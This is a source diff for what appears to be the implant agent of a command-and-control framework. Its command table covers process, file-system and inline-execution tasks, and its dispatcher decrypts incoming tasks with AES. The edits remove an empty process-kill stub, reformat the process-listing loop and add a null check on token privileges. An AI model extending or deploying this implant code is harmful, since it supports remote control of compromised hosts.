@@ -22,7 +22,6 @@ DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_JOB,                      .Function = CommandJob                      },
         { .ID = DEMON_COMMAND_PROC,                     .Function = CommandProc                     },
         { .ID = DEMON_COMMAND_PROC_LIST,                .Function = CommandProcList                 },
-        { .ID = DEMON_COMMAND_PROC_KILL,                .Function = CommandProcKill                 },
         { .ID = DEMON_COMMAND_FS,                       .Function = CommandFS                       },
         { .ID = DEMON_COMMAND_INLINE_EXECUTE,           .Function = CommandInlineExecute            },
         { .ID = DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE,  .Function = CommandAssemblyInlineExecute    },
@@ -48,7 +47,6 @@ VOID CommandDispatcher( VOID )
     LPVOID   TaskBuffer     = NULL;
     UINT32   TaskBufferSize = 0;
     UINT32   CommandID      = 0;
-    BOOL     PackageFirst   = TRUE;
     BOOL     FoundCommand   = FALSE;
 
     PRINTF( "Session ID => %x\n", Instance->Session.DemonID );
@@ -80,11 +78,6 @@ VOID CommandDispatcher( VOID )
                     {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                         ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
-
-                        if ( ! PackageFirst )
-                            ParserGetInt32( &TaskParser );
-                        else
-                            PackageFirst = FALSE;
                     }
 
                     FoundCommand = FALSE;
@@ -118,7 +111,6 @@ VOID CommandDispatcher( VOID )
             break;
 #endif
         }
-        PackageFirst = TRUE;
 
         /* === End routine checks === */
         // Check if we have something in our Pivots connection and sends back the output from the pipes
@@ -550,15 +542,14 @@ VOID CommandProcList( PPARSER Parser )
             ListSize               += Required;
             ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
 
-	    if ( ProcessInformationList != NULL )
-	    {
-        	NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
-            }
+            if ( ProcessInformationList != NULL )
+                NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
             else
             {
-        	PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-            	goto LEAVE;
-       	    }
+                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                goto LEAVE;
+            }
+
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "NtQuerySystemInformation: Failed" )
@@ -566,23 +557,23 @@ VOID CommandProcList( PPARSER Parser )
                 goto LEAVE;
             }
         }
-        if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH ){
-        	
+
+        if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH )
+        {
         	do
         	{
-		    Instance->Win32.LocalFree( ProcessInformationList );
+                Instance->Win32.LocalFree( ProcessInformationList );
 
-		    ListSize               += Required;
-		    ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
-		    if ( ProcessInformationList != NULL )
-		    {
-        	    	NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
-        	    }
-        	    else
-        	    {
-        	        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-            		goto LEAVE;
-        	    }
+                ListSize               += Required;
+                ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
+
+                if ( ProcessInformationList != NULL )
+                    NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
+                else
+                {
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                    goto LEAVE;
+                }
         	}
         	while ( NtStatus == STATUS_INFO_LENGTH_MISMATCH );
         }
@@ -646,12 +637,6 @@ VOID CommandProcList( PPARSER Parser )
 
 LEAVE:
     PackageDestroy( Package );
-}
-
-// TODO: move this to the Proc Function Module
-VOID CommandProcKill( PPARSER DataArgs )
-{
-
 }
 
 VOID CommandFS( PPARSER DataArgs )
@@ -1325,7 +1310,6 @@ VOID CommandToken( PPARSER Parser )
             DWORD             Length      = 0;
             HANDLE            TokenHandle = NULL;
             BOOL              ListPrivs   = ParserGetInt32( Parser );
-            DWORD             UserSize    = 0;
 
             PackageAddInt32( Package, ListPrivs );
 
@@ -1358,9 +1342,12 @@ VOID CommandToken( PPARSER Parser )
                 PUTS( "Privs::Get" )
             }
 
-            MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
-            Instance->Win32.LocalFree( TokenPrivs );
-            TokenPrivs = NULL;
+            if ( TokenPrivs )
+            {
+                MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
+                Instance->Win32.LocalFree( TokenPrivs );
+                TokenPrivs = NULL;
+            }
 
             break;
         }
